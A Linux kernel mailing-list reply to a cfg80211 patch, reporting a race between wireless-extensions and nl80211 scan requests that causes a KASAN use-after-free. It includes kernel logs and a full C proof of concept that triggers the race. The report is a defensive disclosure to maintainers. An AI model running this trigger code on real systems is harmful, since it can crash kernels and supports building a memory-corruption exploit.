Return-Path: <linux-wireless+bounces-37959-lists+linux-wireless=lfdr.de@vger.kernel.org>
Delivered-To: lists+linux-wireless@lfdr.de
Received: from mail.lfdr.de
	by mail.lfdr.de with LMTP
	id yOsSKGbHOGrjhwcAu9opvQ
	(envelope-from <linux-wireless+bounces-37959-lists+linux-wireless=lfdr.de@vger.kernel.org>)
	for <lists+linux-wireless@lfdr.de>; Mon, 22 Jun 2026 07:25:58 +0200
X-Original-To: lists+linux-wireless@lfdr.de
Received: from sin.lore.kernel.org (sin.lore.kernel.org [IPv6:2600:3c15:e001:75::12fc:5321])
	by mail.lfdr.de (Postfix) with ESMTPS id 8FD986ACBD7
	for <lists+linux-wireless@lfdr.de>; Mon, 22 Jun 2026 07:25:57 +0200 (CEST)
Authentication-Results: mail.lfdr.de;
	dkim=pass header.d=qq.com header.s=s201512 header.b="DSdGR+a/";
	spf=pass (mail.lfdr.de: domain of "linux-wireless+bounces-37959-lists+linux-wireless=lfdr.de@vger.kernel.org" designates 2600:3c15:e001:75::12fc:5321 as permitted sender) smtp.mailfrom="linux-wireless+bounces-37959-lists+linux-wireless=lfdr.de@vger.kernel.org";
	dmarc=pass (policy=quarantine) header.from=qq.com;
	arc=pass ("subspace.kernel.org:s=arc-20240116:i=1")
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sin.lore.kernel.org (Postfix) with ESMTP id 7FC6A3003BE8
	for <lists+linux-wireless@lfdr.de>; Mon, 22 Jun 2026 05:25:54 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 580403546C0;
	Mon, 22 Jun 2026 05:25:51 +0000 (UTC)
X-Original-To: linux-wireless@vger.kernel.org
Received: from out162-62-57-87.mail.qq.com (out162-62-57-87.mail.qq.com [162.62.57.87])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 6C0ED23643F;
	Mon, 22 Jun 2026 05:25:46 +0000 (UTC)
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1782105951; cv=none; b=cu0NhBDrhhEl8btu35IAhFiUwoHrQ4M6BAW4Hjt3j/wTQb5WAfrVT7ij2vjAf0RH5y6LegPe8ocqU6w7MjKUsqy8z4j2sB8kCzsHlW66/XZI4troeGWC2KMpGOKOueeVnND8fNLuQ68O54NjAz8ACH1JnP3z3T3VHFlufXQmcJ0=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1782105951; c=relaxed/simple;
	bh=el2GQXROO36seMfkn2JddLNe/vDTgFcGQdMTAJ7cvlE=;
	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
	 In-Reply-To:Content-Type; b=ftsXLR0ZAsghlwpsfQ4IFawU4YgyfvN6CLDYLgPti9x5OAWbMvBlzBFX5Gg4XgZl132l8Fw2iuCjVLlYatFbLKTWcdDXhyrbMFK1EpTraJDOy+KT2uMRbuQJ9ZVYn4Zxp7iPDDG6HqjkF4GIadDYicmiZrr+DL/z2KEuDVfvB1M=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=DSdGR+a/; arc=none smtp.client-ip=162.62.57.87
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
	t=1782105937; bh=/gACr6QXTcIUN+QLMdKk6UQjO38cTXwX+zZXngkjW4w=;
	h=Date:Subject:To:Cc:References:From:In-Reply-To;
	b=DSdGR+a/65cKXzn3sLhO6ED9a4VcnG0lJUFGdByzDXw2grzDZa3C/NTbRKpQrCWqj
	 hQlO1En1dXxyy3wCwe66NyeO4CFCmwBYC2CCV61QgLZVbMj37lVwBoT2pOwxDmXpMr
	 gfP7GMW22a/FCnAXrArNI1uTEdiTKycJmhgErZBc=
Received: from [192.168.3.157] ([115.156.144.140])
	by newxmesmtplogicsvrsza63-0.qq.com (NewEsmtp) with SMTP
	id 662B8EC5; Mon, 22 Jun 2026 13:25:34 +0800
X-QQ-mid: xmsmtpt1782105934tbphiyrx1
Message-ID: <tencent_D39C654EBCC3C95DC8C48841701D8D5D2808@qq.com>
X-QQ-XMAILINFO: M8SslFiB5g9IuUNKg4cPDz9nyCtj3uc95HlyuyB2MbVC2aYvOTbszrxWW4ldq2
	 ARG+XViuONMk1Qlc10iDqM5BpOnAA5sNXRsEPMjFDfg0sKZZx30ME5/v7LggmisnhrH4Cf7Zo2it
	 kIRcCHeOYqFm47vzUOE7/4s1RAoL/R1VqQxYoYSpEl8o0n99ML7PUwVowKcBSzLVJnX9RYpU67+9
	 I1ROOk9cEO2VQLkEmoyWsJkQj775nCQTrzLAHiqILAl6QqLI3VompipVZNMvoGkJWmPPr/n6s6Fh
	 HI8jLQBytnZjHjJsEJLhjZ00Df0k2GaiVS0zjrepZig4gUEmGTpndSVY5IGfOYXyjw1gnRLKN8Nd
	 aG6c4LI8NM+oNkMGUIArSYnDW6m6igGTgSxuMphetjIlHlyyACE7KoZlfza6yovHrzxKcjwHw7x6
	 eGO7QEDY1rILHuFwV9nHxn2F3JtC8lPrprEslKoqAUnLtZqMInbpC41A80oFM0DP2YnRfTiXf4ha
	 jfKkMjm5cwa1Saf/eMj8K1nCwYsrRQ1tVhCOpu5rDL63oSyMkHgW62J7Bs9QbqxHq9w9Wv8/iALZ
	 Xt3m+2N1jHQwFkezsgR5JH9T7y4XwTnPcVXTBStYFNdEHmoLJtxiN2rtPthxtfYVxgNxI+CFztX5
	 h029nvCZoBJbgt25bqjYvtjh9CoDG7KulwmcfGjAWoIx2T3OFgYfjvzBNmGNlxezwML2Yev5q+nw
	 ktIzxt58PoLu8HZNtg9657R+fa129q9ZHRE83bBaV8+kFP3kaA/3DaOua34rhbtxw1XewCn8gair
	 3WP0p/N/qqnkY9FwZG3VyJYaHDGHP4Az09BTzutTXkSFN4wcBMVz2wqFyz9Nx3JGnbj6Qu3+JtkM
	 +Ux+6B+CJANerCUbU53/9Fq47VdJ7HW3tMTbZHiJpUubvshwPp1jIFgFCuIKgakt+VrBfi/WpqJu
	 0rbU0Z1tvsIJ8T/luKyzN6HxirNPqU0lRZ+qvYWXez0ZiypG1z2jQPi/W6kBOxZ7Kh8xS0BMpX//
	 otXgcmyhUIH/u1RzxVIYnkfa+bJqLoATXP1uqdlAUNYb1jzGfCy7vpWKeXn1VB2T5Kg0X8qqn1mI
	 er8fnrmiBfG7R8dVpV9DuqjhUjyQ==
X-QQ-XMRINFO: M/715EihBoGS47X28/vv4NpnfpeBLnr4Qg==
X-OQ-MSGID: <1852d8ff-c32d-4c34-833e-3d9b771228e9@qq.com>
Date: Mon, 22 Jun 2026 13:25:34 +0800
Precedence: bulk
X-Mailing-List: linux-wireless@vger.kernel.org
List-Id: <linux-wireless.vger.kernel.org>
List-Subscribe: <mailto:linux-wireless+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-wireless+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
Subject: Re: [PATCH] wifi: cfg80211: Fix an error handling path in
 cfg80211_wext_siwscan()
To: Christophe JAILLET <christophe.jaillet@wanadoo.fr>,
 Johannes Berg <johannes@sipsolutions.net>,
 "John W. Linville" <linville@tuxdriver.com>
Cc: linux-kernel@vger.kernel.org, kernel-janitors@vger.kernel.org,
 linux-wireless@vger.kernel.org
References: <a1be7eea4da0da18f90589af252bb76a18a61978.1781984889.git.christophe.jaillet@wanadoo.fr>
From: XIAO WU <xiaowu.417@qq.com>
In-Reply-To: <a1be7eea4da0da18f90589af252bb76a18a61978.1781984889.git.christophe.jaillet@wanadoo.fr>
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit
X-Rspamd-Action: no action
X-Spamd-Result: default: False [-2.16 / 15.00];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
	DMARC_POLICY_ALLOW(-0.50)[qq.com,quarantine];
	R_SPF_ALLOW(-0.20)[+ip6:2600:3c15:e001:75::/64];
	R_DKIM_ALLOW(-0.20)[qq.com:s=s201512];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	RCVD_COUNT_THREE(0.00)[4];
	FORGED_RECIPIENTS(0.00)[m:christophe.jaillet@wanadoo.fr,m:johannes@sipsolutions.net,m:linville@tuxdriver.com,m:linux-kernel@vger.kernel.org,m:kernel-janitors@vger.kernel.org,m:linux-wireless@vger.kernel.org,s:lists@lfdr.de];
	FREEMAIL_TO(0.00)[wanadoo.fr,sipsolutions.net,tuxdriver.com];
	FORGED_SENDER_MAILLIST(0.00)[];
	RCVD_TLS_LAST(0.00)[];
	FREEMAIL_FROM(0.00)[qq.com];
	FORGED_SENDER(0.00)[xiaowu.417@qq.com,linux-wireless@vger.kernel.org];
	TO_DN_SOME(0.00)[];
	FORWARDED(0.00)[lists@lfdr.de];
	MIME_TRACE(0.00)[0:+];
	TAGGED_FROM(0.00)[bounces-37959-lists,linux-wireless=lfdr.de];
	FROM_HAS_DN(0.00)[];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	FORGED_SENDER_FORWARDING(0.00)[];
	ALIAS_RESOLVED(0.00)[];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[xiaowu.417@qq.com,linux-wireless@vger.kernel.org];
	FORGED_MUA_MAILLIST(0.00)[];
	MID_RHS_MATCH_FROM(0.00)[];
	TAGGED_RCPT(0.00)[linux-wireless];
	RCPT_COUNT_FIVE(0.00)[6];
	FORGED_RECIPIENTS_FORWARDING(0.00)[];
	DKIM_TRACE(0.00)[qq.com:+];
	ASN(0.00)[asn:63949, ipnet:2600:3c15::/32, country:SG];
	DBL_BLOCKED_OPENRESOLVER(0.00)[sashiko.dev:url,vger.kernel.org:from_smtp,sin.lore.kernel.org:rdns,sin.lore.kernel.org:helo,qq.com:dkim,qq.com:mid,qq.com:from_mime]
X-Rspamd-Server: lfdr
X-Rspamd-Queue-Id: 8FD986ACBD7

Hi Christophe,

Thanks for this fix — the memory leak on the essid_len check failure
path is clearly a bug.

I came across an automated AI code review of this function on the Sashiko
platform[1] that identified a pre-existing race condition in this code
path, and I was able to independently verify it triggers a real
KASAN-detected use-after-free by testing with the mac80211_hwsim driver
in QEMU.

TL;DR: The lockless `rdev->scan_req` check in
cfg80211_wext_siwscan() races with nl80211_trigger_scan().  I was able
to trigger a KASAN slab-use-after-free in ieee80211_scan_work via a
barrier-synchronized two-thread race between SIOCSIWSCAN and
NL80211_CMD_TRIGGER_SCAN.

(This is a pre-existing issue, not introduced by your patch — your fix
is still correct.)

 > diff --git a/net/wireless/scan.c b/net/wireless/scan.c
 > @@ -3612,8 +3612,10 @@ int cfg80211_wext_siwscan(struct net_device *dev,
 >      /* translate "Scan for SSID" request */
 >      if (wreq) {
 >          if (wrqu->data.flags & IW_SCAN_THIS_ESSID) {
 > -            if (wreq->essid_len > IEEE80211_MAX_SSID_LEN)
 > -                return -EINVAL;
 > +            if (wreq->essid_len > IEEE80211_MAX_SSID_LEN) {
 > +                err = -EINVAL;
 > +                goto out;
 > +            }

This fix is correct — the old code leaked `creq`.  However, earlier in
the same function (around line 3530):

     if (rdev->scan_req || rdev->scan_msg)
         return -EBUSY;

This check is done WITHOUT holding the wiphy mutex.  Meanwhile,
nl80211_trigger_scan() acquires the wiphy via `pre_doit` before setting
`rdev->scan_req`.  The race is:

    Thread A (wext)          |   Thread B (nl80211)
                             |
    check rdev->scan_req     |   (wiphy lock acquired by pre_doit)
    → NULL, proceeds         |   check rdev->scan_req → NULL
                             |   set rdev->scan_req = req_B
                             |   rdev_scan(rdev, req_B)
    acquire wiphy lock        |
    rdev->scan_req = req_A    |   ← req_B pointer LOST, overwritten
    rdev_scan(rdev, req_A)   |

When the scan completes, `cfg80211_scan_done()` detects the mismatch:

```
WARNING: net/wireless/scan.c:1199: intreq != rdev->scan_req
          && intreq != rdev->int_scan_req
```

I was able to reproduce this reliably using mac80211_hwsim with a
barrier-synchronized two-thread PoC.  The kernel was 7.1.0 with
CONFIG_KASAN=y, CONFIG_CFG80211_WEXT=y, CONFIG_MAC80211_HWSIM=y.

The WARN_ON from cfg80211_scan_done():
```
[  619.100917][   T27] ------------[ cut here ]------------
[  619.101461][   T27] intreq != rdev->scan_req && intreq != 
rdev->int_scan_req
[  619.101465][   T27] WARNING: net/wireless/scan.c:1199 at 
cfg80211_scan_done+0x19e/0x530
[  619.114641][   T27] Call Trace:
[  619.115207][   T27]  ? __pfx_cfg80211_scan_done+0x10/0x10
[  619.116536][   T27]  __ieee80211_scan_completed+0x34c/0xe50
[  619.117049][   T27]  ieee80211_scan_work+0x3f6/0x2090
[  619.119819][   T27]  cfg80211_wiphy_work+0x2c3/0x550
[  619.121271][   T27]  process_one_work+0xa0b/0x1c50
[  619.122261][   T27]  worker_thread+0x6df/0xf30
```

Followed by a KASAN slab-use-after-free in ieee80211_scan_work:
```
[  614.882691][ T1114] BUG: KASAN: slab-use-after-free in 
ieee80211_scan_work+0x1db4/0x2090
[  614.883408][ T1114] Read of size 4 at addr ffff88811a135024 by task 
kworker/u10:4/1114

[  614.900665][ T1114] Allocated by task 9513:
[  614.901042][ T1114]  kasan_save_stack+0x33/0x60
[  614.902284][ T1114]  __kmalloc_noprof+0x31e/0x7f0
[  614.902719][ T1114]  nl80211_trigger_scan+0x4e3/0x1fb0
[  614.903701][ T1114]  genl_rcv_msg+0x561/0x800

[  614.907688][ T1114] Freed by task 1114:
[  614.908036][ T1114]  kasan_save_stack+0x33/0x60
[  614.909741][ T1114]  kfree+0x165/0x710
[  614.910085][ T1114]  ___cfg80211_scan_done+0x44b/0x9a0

[  614.913247][ T1114] The buggy address is located 36 bytes inside of
[  614.913247][ T1114]  freed 2048-byte region [ffff88811a135000, 
ffff88811a135800)
```

The PoC uses pthread barrier synchronization to force both paths through
the lockless check simultaneously.  It runs on wlan0 created by
mac80211_hwsim (modprobe mac80211_hwsim radios=2).

Full PoC (compile with:  gcc -Wall -o poc poc.c -lpthread):
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <linux/if.h>
#include <linux/netlink.h>
#include <linux/genetlink.h>
#include <linux/nl80211.h>
#include <linux/wireless.h>

static char ifname[IFNAMSIZ] = "wlan0";
static int nl80211_fid = -1;
static int nl_sock = -1;
static volatile int stop = 0;
static int wext_ok, nl_ok;
static pthread_barrier_t barrier_go;

static int resolve_nl80211(void)
{
     char buf[4096];
     struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
     struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
     struct genlmsghdr *genlh;
     struct nlattr *attr;
     int ret;

     memset(buf, 0, sizeof(buf));
     nlh->nlmsg_len = NLMSG_HDRLEN + GENL_HDRLEN +
                      NLA_HDRLEN + sizeof(NL80211_GENL_NAME);
     nlh->nlmsg_type = GENL_ID_CTRL;
     nlh->nlmsg_flags = NLM_F_REQUEST;
     nlh->nlmsg_seq = 1;
     genlh = (struct genlmsghdr *)(buf + NLMSG_HDRLEN);
     genlh->cmd = CTRL_CMD_GETFAMILY;
     genlh->version = 1;
     attr = (struct nlattr *)(buf + NLMSG_HDRLEN + GENL_HDRLEN);
     attr->nla_type = CTRL_ATTR_FAMILY_NAME;
     attr->nla_len = NLA_HDRLEN + sizeof(NL80211_GENL_NAME);
     memcpy((char *)attr + NLA_HDRLEN, NL80211_GENL_NAME,
            sizeof(NL80211_GENL_NAME));
     ret = sendto(nl_sock, buf, nlh->nlmsg_len, 0,
              (struct sockaddr *)&sa, sizeof(sa));
     if (ret < 0) return -1;
     ret = recv(nl_sock, buf, sizeof(buf), 0);
     if (ret < 0) return -1;
     nlh = (struct nlmsghdr *)buf;
     if (!NLMSG_OK(nlh, (unsigned int)ret)) return -1;
     genlh = (struct genlmsghdr *)NLMSG_DATA(nlh);
     char *data = (char *)NLMSG_DATA(nlh) + GENL_HDRLEN;
     int left = ret - (data - (char *)nlh);
     while (left >= (int)sizeof(struct nlattr)) {
         attr = (struct nlattr *)data;
         int al = NLA_ALIGN(attr->nla_len);
         if (al > left || al < (int)sizeof(struct nlattr)) break;
         if (attr->nla_type == CTRL_ATTR_FAMILY_ID) {
             nl80211_fid = *(uint16_t *)((char *)attr + NLA_HDRLEN);
             return 0;
         }
         data += al; left -= al;
     }
     return -1;
}

/* Send NL80211_CMD_TRIGGER_SCAN via generic netlink */
static int send_nlscan(void)
{
     char buf[512];
     struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
     int ifindex = if_nametoindex(ifname);
     if (ifindex <= 0) return -1;

     struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
     struct genlmsghdr *genlh;
     struct nlattr *attr;

     memset(buf, 0, sizeof(buf));
     nlh->nlmsg_type = nl80211_fid;
     nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
     nlh->nlmsg_seq = 1;
     genlh = (struct genlmsghdr *)(buf + NLMSG_HDRLEN);
     genlh->cmd = NL80211_CMD_TRIGGER_SCAN;
     genlh->version = 1;

     char *ptr = buf + NLMSG_HDRLEN + GENL_HDRLEN;
     attr = (struct nlattr *)ptr;
     attr->nla_type = NL80211_ATTR_IFINDEX;
     attr->nla_len = NLA_HDRLEN + 4;
     *(int *)(ptr + NLA_HDRLEN) = ifindex;
     ptr += NLA_ALIGN(attr->nla_len);

     nlh->nlmsg_len = ptr - buf;
     return sendto(nl_sock, buf, nlh->nlmsg_len, 0,
               (struct sockaddr *)&sa, sizeof(sa));
}

/* nl80211 thread: waits for barrier, fires scan request */
static void *nl_thread(void *arg)
{
     (void)arg;
     cpu_set_t cpus; CPU_ZERO(&cpus); CPU_SET(1, &cpus);
     sched_setaffinity(0, sizeof(cpus), &cpus);
     while (!stop) {
         pthread_barrier_wait(&barrier_go);
         if (stop) break;
         /*
          * nl80211_trigger_scan() holds wiphy via pre_doit.
          * rdev->scan_req check at line ~11115 — lockless with
          * respect to the wext path.
          */
         if (send_nlscan() == 0)
             __sync_fetch_and_add(&nl_ok, 1);
         /* drain the ACK */
         char buf[4096];
         struct timeval tv = { .tv_sec = 5 };
         setsockopt(nl_sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
         recv(nl_sock, buf, sizeof(buf), 0);
     }
     return NULL;
}

int main(void)
{
     pthread_t nt;
     struct sockaddr_nl sa;

     setbuf(stdout, NULL);
     signal(SIGPIPE, SIG_IGN);

     printf("PoC: wext vs nl80211 scan race (barrier sync)\n\n");

     /* bring wlan0 up */
     int s = socket(AF_INET, SOCK_DGRAM, 0);
     struct ifreq ifr;
     memset(&ifr, 0, sizeof(ifr));
     strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
     ioctl(s, SIOCGIFFLAGS, &ifr);
     ifr.ifr_flags |= IFF_UP;
     ioctl(s, SIOCSIFFLAGS, &ifr);
     close(s);

     /* set up generic netlink for nl80211 */
     nl_sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
     memset(&sa, 0, sizeof(sa));
     sa.nl_family = AF_NETLINK;
     bind(nl_sock, (struct sockaddr *)&sa, sizeof(sa));
     if (resolve_nl80211() < 0) {
         fprintf(stderr, "nl80211 resolve failed\n");
         return 1;
     }
     printf("nl80211 family: %d\n", nl80211_fid);

     pthread_barrier_init(&barrier_go, NULL, 2);
     pthread_create(&nt, NULL, nl_thread, NULL);

     cpu_set_t cpus; CPU_ZERO(&cpus); CPU_SET(0, &cpus);
     sched_setaffinity(0, sizeof(cpus), &cpus);

     for (int i = 0; i < 20000; i++) {
         /*
          * Barrier: fire both paths simultaneously.
          *
          * wext: checks rdev->scan_req at scan.c:~3530
          *       WITHOUT wiphy lock → lockless relative to nl80211.
          * nl:   holds wiphy from pre_doit.
          */
         pthread_barrier_wait(&barrier_go);

         /* wext path: SIOCSIWSCAN with IW_SCAN_THIS_ESSID */
         int fd = socket(AF_INET, SOCK_DGRAM, 0);
         if (fd >= 0) {
             struct iwreq wrq;
             struct iw_scan_req sr;
             memset(&wrq, 0, sizeof(wrq));
             memset(&sr, 0, sizeof(sr));
             strncpy(wrq.ifr_name, ifname, IFNAMSIZ - 1);
             sr.essid_len = 5;
             memcpy(sr.essid, "test", 5);
             wrq.u.data.flags = IW_SCAN_THIS_ESSID;
             wrq.u.data.length = sizeof(sr);
             wrq.u.data.pointer = (caddr_t)&sr;
             if (ioctl(fd, SIOCSIWSCAN, &wrq) == 0)
                 wext_ok++;
             close(fd);
         }
         if (i % 2000 == 1999)
             printf("[%d] wext=%d nl=%d\n", i + 1, wext_ok, nl_ok);
     }

     stop = 1;
     pthread_barrier_wait(&barrier_go);
     pthread_join(nt, NULL);

     printf("\nFinal: wext=%d nl=%d\n", wext_ok, nl_ok);
     if (wext_ok > 0 && nl_ok > 0) {
         printf("RACE HIT! Both scan paths succeeded.\n"
                "Run: dmesg | grep -E 'WARNING|KASAN|cfg80211_scan'\n");
         fflush(stdout);
         sleep(3);
         system("dmesg | grep -iE 'WARNING|KASAN|cfg80211_scan' | tail 
-20");
     }
     close(nl_sock);
     return 0;
}
```

[1] 
https://sashiko.dev/#/patchset/a1be7eea4da0da18f90589af252bb76a18a61978.1781984889.git.christophe.jaillet%40wanadoo.fr

Thanks,
Xiao


